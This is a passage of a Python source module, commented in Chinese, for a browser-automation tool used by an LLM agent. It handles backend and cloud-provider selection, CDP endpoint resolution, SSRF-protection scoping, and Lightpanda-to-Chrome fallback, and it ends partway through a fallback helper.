#!/usr/bin/env python3
"""
浏览器工具模块

本模块提供基于 agent-browser CLI 的浏览器自动化工具。它支持多种后端 ——
**Browser Use**（云端，Nous 订阅用户的默认选择）、**Browserbase**（云端，直接凭据）
以及 **本地 Chromium** —— 对 agent 侧暴露完全一致的行为。后端会根据配置和可用凭据
自动选择。

本工具使用 agent-browser 的无障碍树（ariaSnapshot）来生成基于文本的页面表示，
因此非常适合不具备视觉能力的 LLM agent。

功能特性：
- **本地模式**（默认）：通过 agent-browser 使用零成本的 headless Chromium。
  可在没有显示器的 Linux 服务器上运行。一次性安装：
  ``agent-browser install``（下载 Chromium）或
  ``agent-browser install --with-deps``（同时为 Debian/Ubuntu/Docker
  安装系统依赖库）。
- **云端模式**：配置后可使用 Browserbase 或 Browser Use 的云端执行环境。
- 按 task ID 进行会话隔离
- 使用无障碍树生成基于文本的页面快照
- 通过 ref 选择器（@e1、@e2 等）与元素交互
- 使用 LLM 摘要进行任务感知的内容抽取
- 自动清理浏览器会话

环境变量：
- BROWSERBASE_API_KEY：直连 Browserbase 云端模式的 API key
- BROWSERBASE_PROJECT_ID：直连 Browserbase 云端模式的项目 ID
- BROWSER_USE_API_KEY：直连 Browser Use 云端模式的 API key
- BROWSERBASE_PROXIES：启用/禁用住宅代理（默认："true"）
- BROWSERBASE_ADVANCED_STEALTH：启用带自定义 Chromium 的高级隐身模式，
  需要 Scale 套餐（默认："false"）
- BROWSERBASE_KEEP_ALIVE：启用 keepAlive，以便断连后会话可重连，
  需要付费套餐（默认："true"）
- BROWSERBASE_SESSION_TIMEOUT：自定义会话超时时间（秒），最大 21600 = 6 小时。
  设置该值可超出项目默认值。常用值：600（10 分钟）、1800（30 分钟）（默认：无）

用法：
    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click

    # 导航到某个页面
    result = browser_navigate("https://example.com", task_id="task_123")

    # 获取页面快照
    snapshot = browser_snapshot(task_id="task_123")

    # 点击某个元素
    browser_click("@e5", task_id="task_123")
"""

import atexit
import functools
import json
import logging
import os
import re
import subprocess
import shutil
import sys
import tempfile
import threading
import time
import requests
from typing import Dict, Any, Optional, List, Tuple, Union
from pathlib import Path
from agent.auxiliary_client import call_llm
from hermes_constants import agent_browser_runnable, get_hermes_home
from utils import env_int, is_truthy_value
from hermes_cli.config import DEFAULT_CONFIG, cfg_get

try:
    from tools.website_policy import check_website_access
except Exception:
    check_website_access = lambda url: None  # noqa: E731 — 策略模块不可用时 fail-open（放行）

try:
    from tools.url_safety import (
        is_safe_url as _is_safe_url,
        is_always_blocked_url as _is_always_blocked_url,
        normalize_url_for_request as _normalize_url_for_request,
    )
except Exception:
    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed：安全模块不可用时全部拦截
    _is_always_blocked_url = lambda url: True  # noqa: E731 — 底层同样 fail-closed
    _normalize_url_for_request = lambda url: url  # noqa: E731 — 尽力而为的兜底
# 浏览器 provider 抽象基类 + 注册表 —— PR #25214 把各厂商的 provider
# （Browserbase / Browser Use / Firecrawl）从 ``tools/browser_providers/``
# 迁移到了 ``plugins/browser/<vendor>/``。分发器会查询注册表；
# 下面以旧类名重新导出，作为向后兼容的垫片（shim），供仍从本模块导入它们的调用方使用。
from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  （legacy 别名）
from agent.browser_registry import (  # noqa: F401  （可被测试 patch 的接口）
    get_provider as _registry_get_browser_provider,
)
from plugins.browser.browserbase.provider import (  # noqa: F401  （legacy 导入面）
    BrowserbaseBrowserProvider as BrowserbaseProvider,
)
from plugins.browser.browser_use.provider import (  # noqa: F401
    BrowserUseBrowserProvider as BrowserUseProvider,
)
from plugins.browser.firecrawl.provider import (  # noqa: F401
    FirecrawlBrowserProvider as FirecrawlProvider,
)
from tools.tool_backend_helpers import normalize_browser_cloud_provider
# Camofox 本地反检测浏览器后端（可选）。
# 当设置了 CAMOFOX_URL 时，所有浏览器操作都会走 camofox 的 REST API，
# 而不是 agent-browser CLI。
try:
    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
except ImportError:
    _is_camofox_mode = lambda: False  # noqa: E731

logger = logging.getLogger(__name__)

# 用于 PATH 极简环境（例如 systemd 服务）的标准 PATH 条目。
# 包含 agent-browser、npx、node 以及 Android 的 glibc 运行器（grun）
# 所需的 Android/Termux 与 macOS Homebrew 路径。
_SANE_PATH_DIRS = (
    "/data/data/com.termux/files/usr/bin",
    "/data/data/com.termux/files/usr/sbin",
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
    "/usr/local/sbin",
    "/usr/local/bin",
    "/usr/sbin",
    "/usr/bin",
    "/sbin",
    "/bin",
)
_SANE_PATH = os.pathsep.join(_SANE_PATH_DIRS)


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    """查找 Homebrew 带版本号的 Node.js bin 目录（例如 node@20、node@24）。

    当 Node 是通过 ``brew install node@24`` 安装、且未链接到 /opt/homebrew/bin 时，
    默认 PATH 上找不到 agent-browser。本函数查找这些目录以便把它们前置到 PATH。
    """
    dirs: list[str] = []
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return tuple(dirs)
    try:
        for entry in os.listdir(homebrew_opt):
            if entry.startswith("node") and entry != "node":
                bin_dir = os.path.join(homebrew_opt, entry, "bin")
                if os.path.isdir(bin_dir):
                    dirs.append(bin_dir)
    except OSError:
        pass
    return tuple(dirs)


def _browser_candidate_path_dirs() -> list[str]:
    """返回有序的浏览器 CLI PATH 候选项，供「发现」与「执行」两个流程共用。"""
    hermes_home = get_hermes_home()
    hermes_node_bin = str(hermes_home / "node" / "bin")
    hermes_node_root = str(hermes_home / "node")
    hermes_nm_bin = str(hermes_home / "node_modules" / ".bin")
    return [hermes_node_bin, hermes_node_root, hermes_nm_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]


def _merge_browser_path(existing_path: str = "") -> str:
    """在已有条目顺序不变的前提下，把浏览器专用的 PATH 兜底项前置。"""
    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
    existing_parts = set(path_parts)
    prefix_parts: list[str] = []

    for part in _browser_candidate_path_dirs():
        if not part or part in existing_parts or part in prefix_parts:
            continue
        if os.path.isdir(part):
            prefix_parts.append(part)

    return os.pathsep.join(prefix_parts + path_parts)

# 限制截图清理频率，避免反复做整目录扫描。
_last_screenshot_cleanup_by_dir: dict[str, float] = {}

# ============================================================================
# 配置
# ============================================================================

# 浏览器命令的默认超时时间（秒）
DEFAULT_COMMAND_TIMEOUT = 30

# 快照内容在触发摘要前的最大 token 数
SNAPSHOT_SUMMARIZE_THRESHOLD = 8000

# 这些命令正常情况下会返回空 stdout（例如 close、record）。
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_cached_command_timeout: Optional[int] = None
_command_timeout_resolved = False


def _get_command_timeout() -> int:
    """从 config.yaml 读取已配置的浏览器命令超时时间。

    读取 ``config["browser"]["command_timeout"]``；若未设置或无法读取，
    回落到 ``DEFAULT_COMMAND_TIMEOUT``（30 秒）。结果在第一次调用后缓存，
    并由 ``cleanup_all_browsers()`` 清空。
    """
    global _cached_command_timeout, _command_timeout_resolved
    if _command_timeout_resolved:
        return _cached_command_timeout  # type: ignore[return-value]

    _command_timeout_resolved = True
    result = DEFAULT_COMMAND_TIMEOUT
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "command_timeout")
        if val is not None:
            result = max(int(val), 5)  # 下限为 5 秒，避免被瞬间杀掉
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    _cached_command_timeout = result
    return result


def _get_vision_model() -> Optional[str]:
    """browser_vision 所用模型（截图分析 —— 多模态）。"""
    return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None


def _get_extraction_model() -> Optional[str]:
    """页面快照文本摘要所用模型 —— 与 web_extract 相同。"""
    return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None


def _resolve_cdp_override(cdp_url: str) -> str:
    """把用户提供的 CDP 端点归一化为一个可直接连接的具体 URL。

    接受以下形式：
    - 完整的 websocket 端点：ws://host:port/devtools/browser/...
    - HTTP 发现端点：http://host:port 或 http://host:port/json/version
    - 裸的 websocket host:port 形式，例如 ws://host:port

    对于「发现式」端点，我们会请求 /json/version 并返回其中的
    webSocketDebuggerUrl，这样下游工具拿到的总是一个具体的浏览器
    websocket，而不是一个含义模糊的 host:port URL。
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning("Failed to resolve CDP endpoint %s via %s: %s", raw, version_url, exc)
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info("Resolved CDP endpoint %s -> %s", raw, ws_url)
        return ws_url

    logger.warning("CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint", version_url)
    return raw


def _get_cdp_override() -> str:
    """返回归一化后的 CDP URL 覆盖值，若未设置则返回空字符串。

    优先级如下：
    1. ``BROWSER_CDP_URL`` 环境变量（由 ``/browser connect`` 做的实时覆盖）
    2. config.yaml 中的 ``browser.cdp_url``（持久化配置）

    当二者之一被设置时，我们会跳过 Browserbase 和本地 headless 启动器，
    直接连接到所提供的 Chrome DevTools Protocol 端点。
    """
    env_override = os.environ.get("BROWSER_CDP_URL", "").strip()
    if env_override:
        return _resolve_cdp_override(env_override)

    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            return _resolve_cdp_override(str(browser_cfg.get("cdp_url", "") or ""))
    except Exception as e:
        logger.debug("Could not read browser.cdp_url from config: %s", e)

    return ""


def _get_dialog_policy_config() -> Tuple[str, float]:
    """从 config 读取 ``browser.dialog_policy`` 与 ``browser.dialog_timeout_s``。

    返回 ``(policy, timeout_s)`` 元组，当键缺失或非法时回落到 supervisor 的默认值。
    """
    # 延迟导入，以便 browser_tool 能在最小化环境中被导入。
    from tools.browser_supervisor import (
        DEFAULT_DIALOG_POLICY,
        DEFAULT_DIALOG_TIMEOUT_S,
        _VALID_POLICIES,
    )

    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {}) if isinstance(cfg, dict) else {}
        if not isinstance(browser_cfg, dict):
            return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S
        policy = str(browser_cfg.get("dialog_policy") or DEFAULT_DIALOG_POLICY)
        if policy not in _VALID_POLICIES:
            logger.debug("Invalid browser.dialog_policy=%r; using default", policy)
            policy = DEFAULT_DIALOG_POLICY
        timeout_raw = browser_cfg.get("dialog_timeout_s")
        try:
            timeout_s = float(timeout_raw) if timeout_raw is not None else DEFAULT_DIALOG_TIMEOUT_S
            if timeout_s <= 0:
                timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        except (TypeError, ValueError):
            timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        return policy, timeout_s
    except Exception:
        return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S


def _ensure_cdp_supervisor(task_id: str) -> None:
    """当端点可达时，为 ``task_id`` 启动一个 CDP supervisor。

    幂等操作 —— 委托给 ``SupervisorRegistry.get_or_start``，当
    ``(task_id, cdp_url)`` 对应的 supervisor 已存在时会跳过，
    URL 变化时会先销毁旧实例再重启。可以放心地在每次
    ``browser_navigate`` / ``/browser connect`` 时调用，无需担心重复挂载。

    按以下顺序解析 CDP URL：
      1. ``BROWSER_CDP_URL`` / ``browser.cdp_url`` —— 覆盖 ``/browser connect``
         以及通过 config 设置的覆盖值。
      2. ``_active_sessions[task_id]["cdp_url"]`` —— 覆盖 Browserbase 以及
         任何其 ``create_session`` 直接返回原始 CDP URL 的云端 provider。

    会吞掉所有异常 —— 挂载 supervisor 失败不得影响浏览器会话本身，
    最坏的情况只是 agent 在快照里看不到 ``pending_dialogs`` / ``frame_tree``
    字段。
    """
    cdp_url = _get_cdp_override()
    if not cdp_url:
        # 兜底：当前活动会话可能携带一个由云端 provider（Browserbase 会设置），
        # 逐会话分配的 CDP URL。
        with _cleanup_lock:
            session_info = _active_sessions.get(task_id, {})
        maybe = str(session_info.get("cdp_url") or "")
        if maybe:
            cdp_url = _resolve_cdp_override(maybe)
    if not cdp_url:
        return
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        policy, timeout_s = _get_dialog_policy_config()
        SUPERVISOR_REGISTRY.get_or_start(
            task_id=task_id,
            cdp_url=cdp_url,
            dialog_policy=policy,
            dialog_timeout_s=timeout_s,
        )
    except Exception as exc:
        logger.debug(
            "CDP supervisor attach for task=%s failed (non-fatal): %s",
            task_id,
            exc,
        )


def _stop_cdp_supervisor(task_id: str) -> None:
    """如果存在，停止 ``task_id`` 对应的 CDP supervisor；否则什么也不做。"""
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        SUPERVISOR_REGISTRY.stop(task_id)
    except Exception as exc:
        logger.debug("CDP supervisor stop for task=%s failed (non-fatal): %s", task_id, exc)


# ============================================================================
# 云端 Provider 注册表
# ============================================================================
#
# 各厂商的浏览器 provider（Browserbase / Browser Use / Firecrawl）都以插件形式
# 存放在 ``plugins/browser/<vendor>/`` 下，并在插件发现阶段通过
# :mod:`agent.browser_registry` 自注册。下方按类名维护的注册表只是一个
# 向后兼容垫片，让那些 ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)``
# 的测试夹具仍然可用 —— 但 ``_get_cloud_provider()`` 实际查询时会走
# :mod:`agent.browser_registry`。
#
# 当测试改写了 ``_PROVIDER_REGISTRY`` 时，我们会尊重它（这样缓存相关的
# 单元测试仍能驱动该函数）；否则以注册表为准。这样既保持了测试面稳定，
# 又允许第三方插件直接放到 ``~/.hermes/plugins/browser/<vendor>/`` 下生效。

_PROVIDER_REGISTRY: Dict[str, type] = {
    "browserbase": BrowserbaseProvider,
    "browser-use": BrowserUseProvider,
    "firecrawl": FirecrawlProvider,
}
# 导入时 _PROVIDER_REGISTRY 的冻结副本，供
# ``_is_legacy_provider_registry_overridden`` 用来检测测试阶段的
# monkeypatch 改写。永远不要修改本字典。
_DEFAULT_PROVIDER_REGISTRY: Dict[str, type] = dict(_PROVIDER_REGISTRY)

_cached_cloud_provider: Optional[CloudBrowserProvider] = None
_cloud_provider_resolved = False
_allow_private_urls_resolved = False
_cached_allow_private_urls: Optional[bool] = None
_cached_agent_browser: Optional[str] = None
_agent_browser_resolved = False

# Lightpanda 引擎支持 —— 与 _get_cloud_provider() 一样做了缓存。
# agent-browser v0.25.3+ 原生支持 ``--engine lightpanda``。
_cached_browser_engine: Optional[str] = None
_browser_engine_resolved = False


def _is_legacy_provider_registry_overridden() -> bool:
    """当测试把 ``_PROVIDER_REGISTRY`` 改写为自定义值时返回 True。

    判定方式：只要发现某个注册项的类并不是该名字对应的「标准插件类」，
    就视为被改写。测试通过
    ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)`` 装入
    自定义工厂（``exploding_factory``、``lambda: fake_provider`` 等）；
    这些条目都无法通过下方的标准类一致性检查。

    说明：未来维护者新增第 4 个内置 provider 时，只需扩展下方的
    ``_DEFAULT_PROVIDER_REGISTRY`` —— 无需在这里维护一份硬编码的 key 集合。
    本检测只是把每个已注册的值与对应的标准类逐一比对。
    """
    try:
        for key, default_cls in _DEFAULT_PROVIDER_REGISTRY.items():
            if _PROVIDER_REGISTRY.get(key) is not default_cls:
                return True
        # 出现默认注册表里没有的额外 key → 同样视为被改写。
        return len(_PROVIDER_REGISTRY) != len(_DEFAULT_PROVIDER_REGISTRY)
    except Exception:
        return False


def _ensure_browser_plugins_loaded() -> None:
    """幂等地触发插件发现流程，使浏览器注册表被填充。

    通常情况下，任何会话里 `model_tools` 都会被早早导入，并作为副作用触发
    `discover_plugins()`。但 `_get_cloud_provider` 可能在尚未经过
    `model_tools` 的上下文中被调用 —— 例如独立脚本、某些单元测试路径、
    parity-sweep 测试框架。这里把发现流程做成幂等且仅有副作用，确保
    无论导入顺序如何，用户总能看到已注册的插件。开销很小：后续调用在
    `_ensure_plugins_discovered` 内部会直接提前返回。
    """
    try:
        from hermes_cli.plugins import _ensure_plugins_discovered

        _ensure_plugins_discovered()
    except Exception as exc:
        logger.debug("Browser plugin discovery failed (non-fatal): %s", exc)


def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
    """返回配置的云端浏览器 provider；本地模式则返回 None。

    读取 ``config["browser"]["cloud_provider"]`` 一次，并在进程生命周期内缓存结果。
    显式指定 ``local`` 会禁用云端兜底。若未设置，则依次回落到
    Browser Use（托管的 Nous 网关或直连 API key），再到 Browserbase（仅直连凭据）
    —— 这就是历史上自动检测的顺序，现在以
    :data:`agent.browser_registry._LEGACY_PREFERENCE` 的遍历形式表达。

    选择过程经由 :mod:`agent.browser_registry` 路由，使第三方浏览器插件
    （``~/.hermes/plugins/browser/<vendor>/``）也能参与显式配置的解析。
    在本模块上覆盖 ``_PROVIDER_REGISTRY`` 或
    ``BrowserUseProvider`` / ``BrowserbaseProvider`` 的测试夹具仍能驱动该函数
    —— 参见 ``_is_legacy_provider_registry_overridden``。
    """
    global _cached_cloud_provider, _cloud_provider_resolved
    if _cloud_provider_resolved:
        return _cached_cloud_provider

    resolved: Optional[CloudBrowserProvider] = None
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        provider_key = None
        if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
            provider_key = normalize_browser_cloud_provider(
                browser_cfg.get("cloud_provider")
            )
            if provider_key == "local":
                _cached_cloud_provider = None
                _cloud_provider_resolved = True
                return None
        if provider_key:
            try:
                if _is_legacy_provider_registry_overridden():
                    # 测试夹具路径：尊重被改写后的字典，使缓存策略单元测试
                    # 继续可用。
                    factory = _PROVIDER_REGISTRY.get(provider_key)
                    if factory is not None:
                        resolved = factory()
                else:
                    # 触发插件发现以确保注册表已填充。幂等操作 —— 后续调用开销很小。
                    _ensure_browser_plugins_loaded()
                    resolved = _registry_get_browser_provider(provider_key)
                    if resolved is None:
                        # 显式配置的名字在注册表中查不到 —— 可能是拼写错误、
                        # 未安装的插件，或注册表填充失败。向用户发出 WARNING
                        # （旧代码通过直接实例化类会抛出带类型的凭据错误；
                        # 迁移后改为抛出此 WARNING）。
                        logger.warning(
                            "browser.cloud_provider=%r is not a registered "
                            "browser plugin; falling back to auto-detect "
                            "(install the corresponding plugin or fix the "
                            "config key spelling).",
                            provider_key,
                        )
            except Exception:
                logger.warning(
                    "Failed to instantiate explicit cloud_provider %r; will retry on next call",
                    provider_key,
                    exc_info=True,
                )
                return None
    except Exception as e:
        # 配置文件可能暂时不可读；仍然尝试自动检测，以便基于环境变量 /
        # 托管网关的凭据能够解析。不固化缓存。
        logger.debug("Could not read cloud_provider from config: %s", e)

    if resolved is None:
        # 自动检测路径：先 Browser Use（托管的 Nous 网关或直连 API key），
        # 再 Browserbase（直连凭据）。这里使用本模块顶部导入的旧类名，
        # 以便测试通过 ``monkeypatch.setattr(browser_tool, "BrowserUseProvider", ...)``
        # 仍能确定性地驱动本分支。第三方浏览器插件有意不暴露给自动检测
        # —— 它们只能通过显式的 ``browser.cloud_provider: <name>`` 参与，
        # 与 :data:`agent.browser_registry._LEGACY_PREFERENCE` 上记录的
        # firecrawl 门槛保持一致。
        try:
            fallback_provider = BrowserUseProvider()
            if fallback_provider.is_configured():
                resolved = fallback_provider
            else:
                fallback_provider = BrowserbaseProvider()
                if fallback_provider.is_configured():
                    resolved = fallback_provider
        except Exception:  # pragma: no cover - 防御性处理：永不污染缓存
            logger.debug("Cloud provider auto-detect failed", exc_info=True)
            return None

    if resolved is None:
        # 暂时为 None —— 凭据可能自愈。不要污染缓存。
        return None

    _cached_cloud_provider = resolved
    _cloud_provider_resolved = True
    return _cached_cloud_provider


from hermes_constants import is_termux as _is_termux_environment


def _browser_install_hint() -> str:
    if _is_termux_environment():
        return "npm install -g agent-browser && agent-browser install"
    return "npm install -g agent-browser && agent-browser install --with-deps"


def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
    return _is_termux_environment() and _is_local_mode() and browser_cmd.strip() == "npx agent-browser"


def _termux_browser_install_error() -> str:
    return (
        "Local browser automation on Termux cannot rely on the bare npx fallback. "
        f"Install agent-browser explicitly first: {_browser_install_hint()}"
    )


def _is_local_mode() -> bool:
    """当浏览器工具将使用本地浏览器后端时返回 True。"""
    if _get_cdp_override():
        return False
    return _get_cloud_provider() is None


def _is_local_backend() -> bool:
    """当浏览器在本地运行、且终端也在本地时返回 True。

    SSRF 防护仅对云端后端（Browserbase、BrowserUse）有意义 —— 在那里
    agent 可能触达远端机器上的内部资源。对于本地后端 —— Camofox，
    或没有配置云端 provider 的内置 headless Chromium —— 用户已经在
    同一台机器上拥有完整的终端与网络访问权，因此该检查不增加任何安全价值。

    但是，当终端运行在容器（docker、modal、daytona、ssh、singularity）中时，
    宿主机上的浏览器可以访问终端无法访问的内部网络。这种情况下，
    即使浏览器技术上算作「本地」，也应启用 SSRF 防护。
    """
    if _is_camofox_mode():
        return True
    if _get_cloud_provider() is not None:
        return False
    # 当终端运行在容器中时，宿主机上的浏览器能访问终端访问不了的内部网络
    # → 视为非本地。
    terminal_backend = os.getenv("TERMINAL_ENV", "local").strip().lower()
    return terminal_backend in ("local", "")


_auto_local_for_private_urls_resolved = False
_cached_auto_local_for_private_urls: bool = True


def _get_browser_engine() -> str:
    """返回已配置的浏览器引擎（``auto``、``lightpanda`` 或 ``chrome``）。

    读取一次 ``config["browser"]["engine"]`` 并缓存结果。
    若未设置，回落到 ``AGENT_BROWSER_ENGINE`` 环境变量，再回落到 ``auto``。

    ``auto`` 表示：完全不传 ``--engine``（agent-browser 默认用 Chrome）。
    ``lightpanda`` 或 ``chrome`` 会作为 ``--engine <value>`` 转发给
    agent-browser v0.25.3+。

    Lightpanda 在导航上快 1.3-5.8 倍，但没有图形渲染器（无法截图）。
    """
    global _cached_browser_engine, _browser_engine_resolved
    if _browser_engine_resolved:
        return _cached_browser_engine

    _browser_engine_resolved = True
    _cached_browser_engine = "auto"  # 安全默认值

    # 配置文件优先
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("engine")
        if val and str(val).strip():
            _cached_browser_engine = str(val).strip().lower()
    except Exception as e:
        logger.debug("Could not read browser.engine from config: %s", e)

    # 回落到环境变量（仅当配置未设置值时）
    if _cached_browser_engine == "auto":
        env_val = os.environ.get("AGENT_BROWSER_ENGINE", "").strip().lower()
        if env_val:
            _cached_browser_engine = env_val

    # 校验：agent-browser 只接受 "chrome" 和 "lightpanda"。
    _VALID_ENGINES = {"auto", "lightpanda", "chrome"}
    if _cached_browser_engine not in _VALID_ENGINES:
        logger.warning(
            "Unknown browser engine %r (valid: %s), falling back to 'auto'",
            _cached_browser_engine, ", ".join(sorted(_VALID_ENGINES)),
        )
        _cached_browser_engine = "auto"

    return _cached_browser_engine


def _should_inject_engine(engine: str) -> bool:
    """当应把引擎 flag 加到 agent-browser 命令时返回 True。

    仅在非云端、非 camofox 的本地会话、且引擎被显式设置（非 ``auto``）时
    注入 ``--engine``。
    """
    if engine == "auto":
        return False
    if _is_camofox_mode():
        return False
    return _is_local_mode()


def _using_lightpanda_engine() -> bool:
    """当本地浏览器命令被配置为使用 Lightpanda 时返回 True。"""
    return _get_browser_engine() == "lightpanda"


def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any]) -> Optional[str]:
    """返回「Lightpanda 结果需要回退到 Chrome」的用户可见原因。

    返回 ``None`` 表示不应触发回退。返回的字符串会被复制到回退结果里，
    以便 CLI/TUI/gateway 用户能看到 Hermes 为了完整性而悄悄从 Lightpanda
    切换到 Chrome 的时机。
    """
    if engine != "lightpanda":
        return None

    # 只重试那些 Chrome 可能产生不同结果的命令。会话管理类命令
    # （close、record）与引擎自身的守护进程绑定，无法换引擎重试。
    _FALLBACK_ELIGIBLE = {"open", "snapshot", "screenshot", "eval", "click",
                          "fill", "scroll", "back", "press", "console", "errors"}
    if command not in _FALLBACK_ELIGIBLE:
        return None

    # 明确的失败
    if not result.get("success"):
        error = str(result.get("error") or "command failed").strip()
        return f"Lightpanda {command!r} failed ({error}); retried with Chrome."

    data = result.get("data", {})

    if command == "snapshot":
        snap = data.get("snapshot", "")
        # 空或几乎为空的快照说明 Lightpanda 无法渲染
        if not snap or len(snap.strip()) < 20:
            return "Lightpanda returned an empty/too-short snapshot; retried with Chrome."

    if command == "screenshot":
        # Lightpanda 会返回一张带熊猫 logo 的占位 PNG。
        # 自 LP PR #1766 把它调整为 1920x1080 之后，该占位图约为 17 KB。
        # 而真正的 Chromium 截图通常在 100 KB 以上。
        path = data.get("path", "")
        if path:
            try:
                size = os.path.getsize(path)
                if size < 20480:
                    logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), "
                                 "triggering Chrome fallback", size)
                    return (
                        f"Lightpanda screenshot was suspiciously small ({size} bytes); "
                        "retried with Chrome."
                    )
            except OSError:
                return "Lightpanda screenshot file was missing/unreadable; retried with Chrome."

    return None


def _needs_lightpanda_fallback(engine: str, command: str, result: Dict[str, Any]) -> bool:
    """检查某个 Lightpanda 结果是否应触发自动回退到 Chrome。"""
    return _lightpanda_fallback_reason(engine, command, result) is not None


def _annotate_lightpanda_fallback(result: Dict[str, Any], reason: str) -> Dict[str, Any]:
    """向浏览器命令结果添加一条用户可见的 Chrome 回退警告。"""
    warning = (
        "⚠ Lightpanda fallback: Chrome was used for this browser action. "
        f"{reason}"
    )
    annotated = dict(result)
    annotated["fallback_warning"] = warning
    annotated["browser_engine"] = "chrome"
    annotated["browser_engine_fallback"] = {
        "from": "lightpanda",
        "to": "chrome",
        "reason": reason,
    }
    data = annotated.get("data")
    if isinstance(data, dict):
        data = dict(data)
        data.setdefault("fallback_warning", warning)
        data.setdefault("browser_engine", "chrome")
        data.setdefault(
            "browser_engine_fallback",
            {"from": "lightpanda", "to": "chrome", "reason": reason},
        )
        annotated["data"] = data
    return annotated


def _copy_fallback_warning(target: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    """把浏览器回退的元信息从内部结果复制到工具响应中。"""
    if result.get("fallback_warning"):
        target["fallback_warning"] = result["fallback_warning"]
        target["browser_engine"] = result.get("browser_engine")
        target["browser_engine_fallback"] = result.get("browser_engine_fallback")
    return target


def _run_chrome_fallback_command(
    task_id: str,
    command: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """在临时 Chrome 会话中、于当前 URL 下运行一条浏览器命令。

    当一个具名守护进程启动后，agent-browser 会锁定引擎。向同一个 Lightpanda
    ``--session`` 再传 ``--engine chrome`` 并不能改变已运行的守护进程。
    因此本辅助函数总是另起一个全新的临时 Chrome 会话，把它导航到当前
    Lightpanda 所在的 URL，执行 ``command``，然后销毁该会话。
    """
    import uuid

    # 1. 从 Lightpanda 会话中取出当前 URL。使用
    # ``_engine_override=\"auto\"``，这样即使 eval 调用本身失败，本辅助函数也
    # 不会递归触发 Lightpanda→Chrome 回退。
    url_result = _run_browser_command(
        task_id, "eval", ["window.location.href"], timeout=10, _engine_override="auto"
    )
    current_url = None
    if url_result.get("success"):
        current_url = url_result.get("data", {}).get("result", "").strip().strip('"').strip("'")
    if not current_url:
        logger.warning("Chrome fallback: could not determine current URL from LP session")
        return {"success": False, "error": "Chrome fallback failed: could not determine current URL"}

    # 2. 创建一个临时 Chrome 会话（绕过 _get_session_info 的缓存）。
    tmp_session = f"h_cfb_{uuid.uuid4().hex[:8]}"
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        return {"success": False, "error": str(e)}

    if not _chromium_installed():
        if _running_in_docker():
            hint = (
                "Chrome fallback requires Chromium, but it is missing. "
                "You're running in Docker — pull the latest image: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hint = (
                "Chrome fallback requires Chromium, but it is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        return {"success": False, "error": hint}

    # 在 Windows 上 npx 是 npx.cmd —— 用 shutil.which 让 CreateProcessW 能
    # 执行该批处理垫片。shutil.which 在 Windows 上会考虑 PATHEXT，
    # 在 POSIX 上则返回可执行文件本身。若 npx 不在 PATH 中（Termux、
    # 精简容器），则回落到裸名，让 Popen 抛出可读的
    # "FileNotFoundError: 'npx'"，而不是 WinError 193。
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]
    base_args = cmd_prefix + ["--engine", "chrome", "--session", tmp_session, "--json"]

    task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
    browser_env = {**os.environ, "AGENT_BROWSER_SOCKET_DIR": task_socket_dir}
